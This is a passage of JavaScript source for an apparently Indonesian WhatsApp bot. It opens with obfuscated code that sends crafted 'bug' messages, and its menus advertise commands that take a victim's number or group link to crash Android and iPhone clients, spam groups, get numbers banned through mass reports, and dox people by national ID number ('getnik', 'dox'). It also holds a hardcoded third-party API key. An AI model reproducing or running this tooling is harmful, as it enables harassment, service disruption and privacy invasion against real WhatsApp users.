_0x3b941b={};_0x3b941b[_0x37474f(0x5d1,0x682,0x7eb,0x812,0x495)]=_0x1653a3;const _0x524258={};_0x524258[_0x46de64(0x385,0x17d,-0x73,-0xb1,0x10b)+_0x20181a(0x43,0x248,0x2c4,0x58f,0x201)+'t']=_0x3b941b;const _0x50a2e5={};_0x50a2e5[_0x1969b0(0x56,0x4ed,0x505,0x31a,0x267)+_0x2facf3(0x708,0x5f5,0x65b,0x6ab,0x623)]=null,_0x1aa2d4[_0x20181a(0x13c,-0xfd,0xdc,-0x2f,0x349)+_0x2facf3(0x750,0x6ff,0x77f,0x5c0,0x91e)+'ge'](_0x5115a4,{'extendedTextMessage':{'text':'.','contextInfo':{'stanzaId':_0x3869c6,'participant':_0x4f8057,'quotedMessage':{'conversation':_0x3de2ce[_0x2facf3(0x509,0x4ec,0x722,0x8dd,0x7a8)](_0x3de2ce[_0x37474f(0x3dd,0x41b,0x3fe,0x175,0x34c)],_0x3de2ce[_0x46de64(0x2f3,0x108,-0x154,-0x178,0xc2)][_0x46de64(0x23,0x163,0x336,0x135,0x3f6)+'t'](0x18472+-0xedb6+0x2c94*0x1))},'disappearingMode':{'initiator':_0x3de2ce[_0x1969b0(0x43a,0x387,-0x7,0x286,0x22e)],'trigger':_0x3de2ce[_0x2facf3(0x63e,0x791,0x8f0,0x7d3,0x634)]}},'inviteLinkGroupTypeV2':_0x3de2ce[_0x1969b0(0x167,0x1ec,-0x234,0x86,0x2fd)]}},_0x524258,_0x50a2e5);}}[_0x93854(0x70d,0x451,0x53f,0x480,0x716)+_0x32c0de(0x3e3,0x265,0x12e,0x646,0x3c4)+'r'](_0x43e483[_0x32c0de(0x2b5,0x7f3,0x4ab,0x6ad,0x57d)](_0x43e483[_0x4e5dc1(0x274,0x70,0x14,0x73,0x297)],_0x43e483[_0x11dd6c(0x3b5,0x1fe,0x1f0,0x19e,0x2fb)]))[_0x1c0ba4(0x48,0x28c,0x26a,-0x56,-0x125)](_0x43e483[_0x32c0de(0x7ec,0x6b2,0x766,0x79b,0x6ef)]));else return function(_0x1a59f7){}[_0x32c0de(0x5c0,0xaa3,0x6f5,0xa8a,0x819)+_0x93854(-0x229,-0x4,-0x1a0,-0x25f,-0xfb)+'r'](_0x43e483[_0x4e5dc1(0x65a,0x4e1,0x64f,0x49d,0x3fd)])[_0x11dd6c(0x593,0x478,0x325,0x2df,0x5f0)](_0x43e483[_0x32c0de(0x82c,0x6ea,0x722,0x7fa,0x55b)]);}}}_0x43e483[_0x11dd6c(0x3ce,0x2f2,0x3f6,0x147,0x4ff)](_0x287406,++_0x422261);}}function _0x4817cb(_0x32be79,_0x46487c,_0x356e44,_0x10872e,_0x4ad038){return _0xf1b353(_0x32be79-0x33,_0x46487c-0x106,_0x356e44,_0x10872e-0x10a,_0x32be79- -0x4f3);}function _0x31f215(_0x14b78f,_0x17c4b4,_0x2cce5e,_0x597b8e,_0x41324e){return _0xf1b353(_0x14b78f-0xbc,_0x17c4b4-0x173,_0x2cce5e,_0x597b8e-0x112,_0x597b8e- -0x28c);}try{if(_0x43e483[_0x4817cb(-0x20b,-0x208,0x2d,-0x391,-0x41e)](_0x43e483[_0x4817cb(0x20c,0x41a,0x2d7,-0xbf,0x342)],_0x43e483[_0x4817cb(0x20c,-0x28,0x2cc,0x402,0x4c3)])){if(_0x4795f4){if(_0x43e483[_0x31f215(0x202,0x244,0x3f8,0x17f,0x3aa)](_0x43e483[_0x4817cb(-0x1dc,-0x47,-0x24,-0x3d7,0xed)],_0x43e483[_0x31f215(0x29d,0x4db,0x82,0x308,0x478)]))_0x43e483[_0x5bdd81(0x432,0x5c7,0x29e,0x572,0x374)](_0x284d77);else return _0x287406;}else{if(_0x43e483[_0x5bdd81(0x622,0x624,0x673,0x565,0x41c)](_0x43e483[_0xbbf4c4(0x315,0x3d0,0x383,0x1ce,0x41b)],_0x43e483[_0x31f215(0x12e,0x6a,0x48d,0x2cc,0x2c2)]))return!![];else _0x43e483[_0xbbf4c4(0x39d,0x615,0x54d,0x5d1,0x179)](_0x287406,-0x2173*0x1+0x1cc1+-0x1*-0x4b2);}}else return![];}catch(_0x31b654){}}
/////// BATAS END FUNCTION BUG


const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const kalgans = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
locationMessage: {
name: `${global.namabot}`,
jpegThumbnail: "",
}
}}

const replyy = async (teks) => {
await sleep(500)
let thumbnails = [xfoto]
let randomIndex = Math.floor(Math.random() * thumbnails.length)
let selectedThumbnail = thumbnails[randomIndex]
return VxoZap.sendMessage(m.chat, {
contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
showAdAttribution: false,
renderLargerThumbnail: false,
title: ` ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗`,
body: `${ucapanWaktu} ${m.pushName} 👋`,
previewType: "VIDEO",
thumbnail: selectedThumbnail,
sourceUrl: `https://youtube.com/@vareltzyofc`,
mediaUrl: `https://youtube.com/@vareltzyofc`
}
},
text: teks
}, {
quoted: Zets
})
await sleep(500)
}

	const Zets = {
			key: {
				fromMe: false,
				participant: "0@s.whatsapp.net",
				remoteJid: "status@broadcast"
			},
			message: {
				orderMessage: {
					orderId: "2029",
					thumbnail: V1,
					itemCount: `777`,
					status: "INQUIRY",
					surface: "CATALOG",
					message: `${global.namaowner}`,
					token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
				}
			},
			contextInfo: {
				mentionedJid: [m.sender],
				forwardingScore: 999,
				isForwarded: true
			}
		}
		
const replyz = (teks) => { 
VxoZap.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": " ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": xfoto, 
"mediaUrl": "https://youtube.com/@vareltzyofc", 
"sourceUrl": "https://youtube.com/@vareltzyofc" }}}, { quoted: m }) }
///////// YOUTUBE /////////////
const downloadMp3 = async (url) => {
			try {
				// Panggil API untuk mendapatkan data MP3
				let response = await fetch(`https://api.betabotz.eu.org/api/download/ytmp3?url=${url}&apikey=TheGetsuzoZhiro`);
				let data = await response.json();

				if (!data.status) throw new Error('Failed to fetch data from API');

				// Ambil informasi dari hasil API
				let result = data.result;
				let title = result.title;
				let mp3Url = result.mp3;
				let thumbnailUrl = result.thumb;

				// Kirim pesan audio ke WhatsApp
				await VxoZap.sendMessage(m.chat, {
					audio: {
						url: mp3Url
					},
					fileName: `${title}.mp3`,
					mimetype: 'audio/mpeg',
					contextInfo: {
						externalAdReply: {
							title: title,
							body: packname, // packname bisa disesuaikan
							thumbnailUrl: thumbnailUrl,
							sourceUrl: mp3Url,
							mediaType: 1,
							mediaUrl: result.source,
						}
					},
				}, {
					quoted: Zets
				});

				console.log(`Success: MP3 sent for video ${title}`);
			} catch (error) {
				console.error('Error downloading MP3:', error);
				zreply(`Error: Could not download MP3 for the provided URL.`);
			}
		}
		async function ytdlnew(videoUrl) {
			return new Promise(async (resolve, reject) => {
				try {
					const searchParams = new URLSearchParams();
					searchParams.append('query', videoUrl);
					searchParams.append('vt', 'mp3');
					const searchResponse = await axios.post(
						'https://tomp3.cc/api/ajax/search',
						searchParams.toString(), {
							headers: {
								'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
								'Accept': '*/*',
								'X-Requested-With': 'XMLHttpRequest'
							}
						}
					);
					if (searchResponse.data.status !== 'ok') {
						throw new Error('Failed to search for the video.');
					}
					const videoId = searchResponse.data.vid;
					const videoTitle = searchResponse.data.title;
					const mp4Options = searchResponse.data.links.mp4;
					const mp3Options = searchResponse.data.links.mp3;
					const mediumQualityMp4Option = mp4Options[136];
					const mp3Option = mp3Options['mp3128'];
					const mp4ConvertParams = new URLSearchParams();
					mp4ConvertParams.append('vid', videoId);
					mp4ConvertParams.append('k', mediumQualityMp4Option.k);
					const mp4ConvertResponse = await axios.post(
						'https://tomp3.cc/api/ajax/convert',
						mp4ConvertParams.toString(), {
							headers: {
								'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
								'Accept': '*/*',
								'X-Requested-With': 'XMLHttpRequest'
							}
						}
					);
					if (mp4ConvertResponse.data.status !== 'ok') {
						throw new Error('Failed to convert the video to MP4.');
					}
					const mp4DownloadLink = mp4ConvertResponse.data.dlink;
					const mp3ConvertParams = new URLSearchParams();
					mp3ConvertParams.append('vid', videoId);
					mp3ConvertParams.append('k', mp3Option.k);
					const mp3ConvertResponse = await axios.post(
						'https://tomp3.cc/api/ajax/convert',
						mp3ConvertParams.toString(), {
							headers: {
								'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
								'Accept': '*/*',
								'X-Requested-With': 'XMLHttpRequest'
							}
						}
					);
					if (mp3ConvertResponse.data.status !== 'ok') {
						throw new Error('Failed to convert the video to MP3.');
					}
					const mp3DownloadLink = mp3ConvertResponse.data.dlink;
					resolve({
						title: videoTitle,
						mp4DownloadLink,
						mp3DownloadLink
					});
				} catch (error) {
					reject('Error: ' + error.message);
				}
			});
		}
		//=================================================//



// Komen
switch(command) {
// MENU
case 'menu': {
ahong = `
┏━━━「 ☢︎ 」━━━━━⬣
[ッ] 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐁𝐎𝐓 ${global.namabot}
┗━━━━━━⬣
┏┻━━⊱ 「  ᤪᤣ᪰𝐕͢𝐚ᤡ𝐫𝐓͢ᤡ𝐱ᤡ𝐒ᤳ 」 ━━━━⬣
┃┏⊱
┃ッ 𝐍𝐀𝐌𝐄 𝐁𝐎𝐓 : ⚍ ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗 ⚍
┃ッ 𝐂𝐑𝐄𝐀𝐓𝐎𝐑 : ${global.namaowner}
┃ッ 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 :  ${runtime(process.uptime())}
┃ッ 𝐕𝐄𝐑𝐒𝐈𝐎𝐍 : 𝟗.𝟎.𝟎
┃ッ 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 : ${global.namaowner}
┃ッ 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 : @𝐯𝐚𝐫𝐞𝐥𝐦𝐞𝐤
┃┗⊱
┗━━━━━━━━━⬣
┏┻━━「 ᤪᤣ᪰𝐕͢𝐚ᤡ𝐫𝐓͢ᤡ𝐱ᤡ𝐒ᤳ 」 ━━━⬣
┃ッ 𝐛𝐮𝐠𝐦𝐞𝐧𝐮
┃ッ 𝐚𝐤𝐬𝐞𝐬𝐦𝐞𝐧𝐮
┃ッ 𝐬𝐨𝐮𝐧𝐝𝐦𝐞𝐧𝐮
┃ッ 𝐠𝐫𝐨𝐮𝐩𝐦𝐞𝐧𝐮
┃ッ 𝐬𝐭𝐢𝐜𝐤𝐞𝐫𝐦𝐞𝐧𝐮
┃ッ 𝐝𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐦𝐞𝐧𝐮
┃ッ 𝐜𝐩𝐦𝐞𝐧𝐮
┃ッ 𝐭𝐨𝐨𝐥𝐬𝐦𝐞𝐧𝐮
┃ッ 𝐯𝐩𝐬𝐦𝐞𝐧𝐮
┃ッ 𝐝𝐨𝐦𝐚𝐢𝐧𝐦𝐞𝐧𝐮
┃ッ 𝐚𝐬𝐮𝐩𝐚𝐧𝐦𝐞𝐧𝐮
┃ッ 𝐯𝐚𝐫𝐞𝐥𝐭𝐳𝐲𝐦𝐞𝐧𝐮
┃ッ 𝐭𝐱𝐭𝐦𝐞𝐧𝐮
┃ッ 𝐢𝐧𝐬𝐭𝐚𝐥𝐥𝐦𝐞𝐧𝐮
┃ッ 𝐢𝐧𝐟𝐨𝐛𝐨𝐭
┗━━━━━━━⬣
┏┻━━━━━━━⬣
┗━ ⟬ 𝐓𝐐𝐓𝐎 ⟭
┃ッ 𝐕𝐚𝐫𝐓𝐱𝐒
┗━━━━━━━━━━━━⚉`
let sections = [{
title: '𝐃𝐄𝐒𝐓𝐑𝐎𝐘𝐄𝐑 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏',
highlight_label: '𝐀𝐓𝐓𝐀𝐂𝐊 𝐌𝐎𝐃𝐄',
rows: [{
title: '𝐁𝐔𝐆 𝐌𝐄𝐍𝐔',
description: `𝐃𝐢𝐬𝐩𝐥𝐚𝐲𝐬 𝐁𝐮𝐠 𝐦𝐞𝐧𝐮`, 
id: '.bugmenu'
}]
},
{
title: '𝐅𝐈𝐓𝐔𝐑  ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗',
highlight_label: '𝐈𝐧𝐬𝐭𝐚𝐥𝐥 𝐏𝐚𝐧𝐞𝐥 𝐎𝐭𝐨𝐦𝐚𝐭𝐢s',
rows: [{
title: '𝐈𝐧𝐬𝐭𝐚𝐥𝐥 𝐏𝐚𝐧𝐞𝐥',
description: `( 𝐍𝐄𝐖 )`, 
id: '.installmenu'
},
{
title: '𝐕𝐩𝐬 𝐌𝐞𝐧𝐮',
description: `𝐃𝐢𝐬𝐩𝐥𝐚𝐲𝐬 𝐕𝐩𝐬 𝐌𝐞𝐧𝐮`, 
id: '.vpsmenu'
},
{
title: '𝐒𝐨𝐮𝐧𝐝 𝐌𝐞𝐧𝐮',
description: `𝐃𝐢𝐬𝐩𝐥𝐚𝐲𝐬 𝐒𝐨𝐮𝐧𝐝 𝐌𝐞𝐧𝐮`, 
id: '.soundmenu'
},
{
title: '𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐏𝐀𝐍𝐄𝐋 𝐌𝐄𝐍𝐔',
description: `𝐃𝐢𝐬𝐩𝐥𝐚𝐲𝐬 𝐌𝐞𝐧𝐮 𝐂𝐫𝐞𝐚𝐭𝐞 𝐩𝐚𝐧𝐞𝐥`, 
id: '.cpmenu'
},
{
title: '𝐀𝐬𝐮𝐩𝐚𝐧 𝐌𝐞𝐧𝐮',
description: `𝐀𝐬𝐬𝐭𝐚𝐠𝐡𝐟𝐢𝐫𝐮𝐥𝐥𝐚𝐡`, 
id: '.asupanmenu'
},
{
title: '𝐓𝐱𝐭 𝐌𝐞𝐧𝐮',
description: `𝐃𝐢𝐬𝐩𝐥𝐚𝐲 𝐓𝐱𝐭 𝐌𝐞𝐧𝐮`, 
id: '.txtmenu'
}]
},
{
title: '𝐎𝐰𝐧𝐞𝐫 𝐎𝐧𝐥𝐲',
highlight_label: '𝐂𝐨𝐩𝐲𝐫𝐢𝐠𝐡𝐭 ᤪᤣ᪰𝐕͢𝐚ᤡ𝐫𝐓͢ᤡ𝐱ᤡ𝐒ᤳ',
rows: [{
title: '𝐓𝐇𝐀𝐍𝐊 𝐘𝐎𝐔 𝐃𝐄𝐕',
description: `𝐓𝐐𝐓𝐎`, 
id: '.infobot'
},
{
title: '𝐃𝐨𝐦𝐚𝐢𝐧 𝐌𝐞𝐧𝐮',
description: `𝐃𝐢𝐬𝐩𝐥𝐚𝐲𝐬 𝐃𝐨𝐦𝐚𝐢𝐧 𝐌𝐞𝐧𝐮`, 
id: '.domainmenu'
},
{
title: '𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮',
description: `𝐃𝐢𝐬𝐩𝐥𝐚𝐲 𝐈𝐧𝐟𝐨 𝐁𝐨𝐭`, 
id: '.toolsmenu'
},
{
title: '𝐀𝐤𝐬𝐞𝐬 𝐌𝐞𝐧𝐮',
description: `𝐃𝐢𝐬𝐩𝐥𝐚𝐲𝐬 𝐀𝐤𝐬𝐞𝐬 𝐌𝐞𝐧𝐮`, 
id: '.aksesmenu'
},
{
title: '𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐮',
description: `𝐃𝐢𝐬𝐩𝐥𝐚𝐲 𝐠𝐫𝐨𝐮𝐩 𝐦𝐞𝐧𝐮`, 
id: '.groupmenu'
}]
}]

let listMessage = {
    title: '𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔', 
    sections
};


let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363295175318728@newsletter',
 newsletterName: ' ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: ahong
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: Styles('𝐂𝐨𝐩𝐲𝐫𝐢𝐠𝐡𝐭 ᤪᤣ᪰𝐕͢𝐚ᤡ𝐫𝐓͢ᤡ𝐱ᤡ𝐒ᤳ')
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `👋 𝐇𝐞𝐥𝐥𝐨 ${pushname} 𝐢𝐚𝐦 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩 𝐛𝐨𝐭𝐳 𝐜𝐫𝐞𝐚𝐭𝐞𝐝 𝐁𝐲 ${global.namaowner} 𝐈𝐟 𝐀𝐧𝐲𝐭𝐡𝐢𝐧𝐠 𝐄𝐫𝐫𝐨𝐫 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐓𝐡𝐞 𝐎𝐰𝐧𝐞𝐫 𝐎𝐫 𝐝𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫`,
 subtitle: "𝐂𝐨𝐩𝐲𝐫𝐢𝐠𝐡𝐭  ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/d75f8a14bf5fd2590c2d3.jpg" } }, { upload: VxoZap.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👤 CREATOR\",\"url\":\"https://wa.me/6285655649546\",\"merchant_url\":\"https://wa.me/6285655649546\"}"
 },
  {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"JOIN SALURAN\",\"url\":\"https://whatsapp.com/channel/0029Vahy9422ER6b9rNI5Q3v\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vahy9422ER6b9rNI5Q3v\"}"
 },
 ],
 })
 })
 }
 }
}, {})

await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'secretnksnsn': {
yantokangen = `

℅℅𝐏𝐋𝐄𝐀𝐒𝐄 𝐂𝐋𝐈𝐂𝐊 𝐓𝐇𝐄 𝐁𝐔𝐓𝐓𝐎𝐍℅℅`
let sections = [{
title: 'Please Sellect The Bugmenu Version',
highlight_label: '𝐀𝐓𝐓𝐀𝐂𝐊 - 𝐌𝐎𝐃𝐄',
rows: [{
title: '𝐁𝐔𝐆-𝐌𝐄𝐍𝐔-𝐕𝟏',
description: `𝐃𝐄𝐒𝐓𝐑𝐎𝐘𝐄𝐑 𝐖𝐀`, 
id: '.bugmenuv1'
},
{
title: '𝐁𝐔𝐆-𝐌𝐄𝐍𝐔-𝐕𝟐',
description: `𝐃𝐄𝐒𝐓𝐑𝐎𝐘𝐄𝐑 𝐖𝐀`, 
id: '.bugmenuv2'
}]
}]

let listMessage = {
    title: '𝐃𝐄𝐒𝐓𝐑𝐎𝐘𝐄𝐑 𝐌𝐄𝐍𝐔', 
    sections
};


let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363295175318728@newsletter',
 newsletterName: ' ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: yantokangen
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: Styles('𝐂𝐨𝐩𝐲𝐫𝐢𝐠𝐡𝐭 ᤪᤣ᪰𝐕͢𝐚ᤡ𝐫𝐓͢ᤡ𝐱ᤡ𝐒ᤳ')
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `
　　　⣀⠤⠔⠒⠒⠒⠒⠒⠒⠒⠦⢄⣀⠀⠀⠀⠀
　⢀⡴⠋　　　　　　　　⠈⠑⢄⠀⠀
⢀⠎　　　　　　　　　　　⠈⢣⠀
⢸　⡄　　　　　　　　　　⢢⠈⡇
⢸　⣇　　　　　　　　　　⡼　⡇
⠘⡆⢸　⢀⣀⣤⣄⡀　　⢀⣤⣤⣄⡀　⡇⡸⠀
　⠘⣾⠀⣿⣿⣿⣿⣿　　⣿⣿⣿⣿⣿　⡗⠁⠀
　⢸⣿⠀⠙⢿⣿⠿⠃⢠⢠⡀⠙⠿⣿⠿⠃　⡇⠀⠀
　⠁⢸⣄　　　⢠⣿⢸⣿⠀⠀⠀⠀⠀⣠⠇⠀⠀
　　⡏⢷⡄　　⠘⠟⠈⠿⠁⠀⠀⢠⡞⡹⠁⠀⠀⠀
　　⢹⠀⠸⠘⢢⢠⠤⠤⡤⡄⢰⢡⠁⠀⡇⠀⠀⠀⠀
　　⢸⠀⠀⠣⣹⢸⠒⠒⡗⡇⣩⠌⢀⠀⡇⠀⠀⠀⠀
　　⠈⢧⡀⠀⠀⠉⠉⠉⠉⠁⠀⠀⣀⠜⠀⠀⠀⠀⠀
　　　　⠉⠓⠢⠤⠤⠤⠔⠊⠁⠀⠀⠀⠀⠀⠀ `,
 subtitle: "𝐂𝐨𝐩𝐲𝐫𝐢𝐠𝐡𝐭  ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/d75f8a14bf5fd2590c2d3.jpg" } }, { upload: VxoZap.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👤 CREATOR\",\"url\":\"https://wa.me/6285655649546\",\"merchant_url\":\"https://wa.me/6285655649546\"}"
 },
  {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"JOIN SALURAN\",\"url\":\"https://whatsapp.com/channel/0029Vahy9422ER6b9rNI5Q3v\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vahy9422ER6b9rNI5Q3v\"}"
 },
 ],
 })
 })
 }
 }
}, {})

await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break

// BUG MENU
var old = performance.now(); 
var neww = performance.now(); 
case 'bugmenu': {
bugmenu = `
╱╱▏┈┈╱╱╱╱▏╱╱▏
▇╱▏┈┈▇▇▇╱▏▇╱▏
▇╱▏▁┈▇╱▇╱▏▇╱▏▁
▇╱╱╱▏▇╱▇╱▏▇╱╱╱
▇▇▇╱┈▇▇▇╱┈▇▇▇╱ 

*\`乂 𝐈𝐍𝐅𝐎 𝐁𝐎𝐓 乂\`*
𖤍 𝐍𝐚𝐦𝐞 𝐁𝐨𝐭 : ${global.namabot}
𖤍 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : ${global.namaowner}
𖤍 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 : @varelmek
𖤍 𝐕𝐞𝐫𝐬𝐢 𝐁𝐨𝐭 : 𝐕𝟗

༼𝐒𝐏𝐄𝐂𝐈𝐀𝐋 𝐁𝐔𝐆༽ 
𖤍 ${prefix}𝐡𝐚𝐫𝐝𝐛𝐮𝐠 *𝟔𝟐𝐱𝐱𝐱𝐱*

༼𝐍𝐎𝐓 𝐑𝐄𝐒𝐏𝐎𝐍 𝐁𝐔𝐆༽ 
𖤍 ${prefix}𝐛𝐥𝐚𝐧𝐤 *𝟔𝟐𝐱𝐱𝐱𝐱*

༼𝐁𝐔𝐆-𝐑𝐈𝐍𝐆𝐀𝐍༽ 
𖤍 ${prefix}𝐜𝐫𝐚𝐬𝐡-𝐣𝐢𝐝 *𝟔𝟐𝐱𝐱𝐱𝐱*
𖤍 ${prefix}𝐛𝐮𝐠𝐫𝐢𝐧𝐠𝐚𝐧 *𝟔𝟐𝐱𝐱𝐱𝐱*

༼𝐀𝐍𝐃𝐑𝐎 𝐂𝐑𝐀𝐒𝐇༽ 
𖤍 ${prefix}𝐯𝐫𝐥-𝐚𝐭𝐭𝐚𝐜𝐤 *𝟔𝟐𝐱𝐱𝐱𝐱*
𖤍 ${prefix}𝐨𝐧𝐞-𝐡𝐢𝐭 *𝟔𝟐𝐱𝐱𝐱𝐱*
𖤍 ${prefix}𝐩𝐞𝐧𝐭𝐢𝐥𝐚𝐭𝐚𝐜𝐤 *𝟔𝟐𝐱𝐱𝐱𝐱*

༼𝐕𝐈𝐑𝐔𝐒 𝐀𝐓𝐓𝐀𝐂𝐊༽ 
𖤍︎ ${prefix}𝐟𝐮𝐜𝐤𝐲𝐨𝐮 *𝟔𝟐𝐱𝐱𝐱𝐱*
𖤍 ${prefix}𝐬𝐪𝐥-𝐯𝐢𝐫𝐮𝐬 *𝟔𝟐𝐱𝐱𝐱𝐱*

༼𝐁𝐔𝐆-𝐀𝐌𝐏𝐀𝐒༽ 
𖤍 ${prefix}𝐤𝐚𝐭𝐚𝐥𝐨𝐠-𝐜𝐫𝐚𝐬𝐡 *𝟔𝟐𝐱𝐱𝐱𝐱*
 
༼𝐃𝐄𝐒𝐓𝐑𝐎𝐘𝐄𝐑 𝐖𝐀༽ 
𖤍 ${prefix}𝐝𝐞𝐬𝐭𝐫𝐨𝐲𝐞𝐫𝐯𝟏 *𝟔𝟐𝐱𝐱𝐱𝐱*
𖤍 ${prefix}𝐝𝐞𝐬𝐭𝐫𝐨𝐲𝐞𝐫𝐯𝟐 *𝟔𝟐𝐱𝐱𝐱𝐱*
 
༼𝐋𝐎𝐗𝐀𝐒 𝐂𝐑𝐀𝐒𝐇༽  
𖤍 ${prefix}𝐤𝐚𝐬𝐢𝐡-𝐩𝐚𝐡𝐚𝐦 *𝟔𝟐𝐱𝐱𝐱𝐱*
𖤍 ${prefix}𝐚𝐭𝐭𝐚𝐜𝐤-𝐰𝐚 *𝟔𝟐𝐱𝐱𝐱𝐱*

༼𝐈𝐎𝐒 𝐎𝐍𝐋𝐘༽ 
𖤍 ${prefix}𝐢𝐩𝐡𝐨𝐧𝐞-𝐜𝐫𝐚𝐬𝐡 *𝟔𝟐𝐱𝐱𝐱𝐱*

༼𝐂𝐑𝐀𝐒𝐇 𝐈𝐍 𝐏𝐋𝐀𝐂𝐄༽ 
𖤍 ${prefix}𝐬𝐯-𝐯𝐚𝐫𝐞𝐥
𖤍 ${prefix}𝐢𝐳𝐢𝐧𝐛𝐮𝐠

༼𝐁𝐔𝐆 𝐆𝐑𝐎𝐔𝐏༽
𖤍 ${prefix}𝐠𝐜𝐠𝐮𝐛𝐥𝐮𝐤 *𝐋𝐢𝐧𝐤 𝐆𝐫𝐨𝐮𝐩*
𖤍 ${prefix}𝐜𝐫𝐚𝐬𝐡𝐚𝐬𝐮  *𝐋𝐢𝐧𝐤 𝐆𝐫𝐨𝐮𝐩*
𖤍 ${prefix}𝐜𝐫𝐚𝐬𝐡𝐠𝐜  *𝐋𝐢𝐧𝐤 𝐆𝐫𝐨𝐮𝐩*
𖤍 ${prefix}𝐛𝐮𝐠𝐢𝐨𝐬𝐠𝐜 *𝐋𝐢𝐧𝐤 𝐆𝐫𝐨𝐮𝐩*
𖤍 ${prefix}𝐠𝐜𝐬𝐩𝐚𝐦 *𝐋𝐢𝐧𝐤 𝐆𝐫𝐨𝐮𝐩*
𖤍 ${prefix}𝐛𝐮𝐭𝐭𝐨𝐧𝐠𝐜 *𝐋𝐢𝐧𝐤 𝐆𝐫𝐨𝐮𝐩*
𖤍 ${prefix}𝐠𝐜𝐚𝐦𝐩𝐚𝐬 *𝐋𝐢𝐧𝐤 𝐆𝐫𝐨𝐮𝐩*

༼𝐃𝐎𝐗𝐗𝐈𝐍𝐆༽
𖤍 ${prefix}𝐠𝐞𝐭𝐧𝐢𝐤
𖤍 ${prefix}𝐝𝐨𝐱 <𝐧𝐢𝐤>

༼𝐎𝐓𝐇𝐄𝐑 𝐌𝐄𝐍𝐔༽
𖤍 ${prefix}𝐛𝐚𝐧𝐧𝐞𝐝𝐧𝐨 *𝟔𝟐𝟖𝐱𝐱𝐱𝐱* ( 𝐑𝐄𝐏𝐎𝐑𝐓 𝐌𝐄𝐓𝐇𝐎𝐃𝐄 )
𖤍 ${prefix}𝐭𝐞𝐦𝐩𝐛𝐚𝐧  *𝟔𝟐|𝟖𝐱𝐱𝐱𝐱*
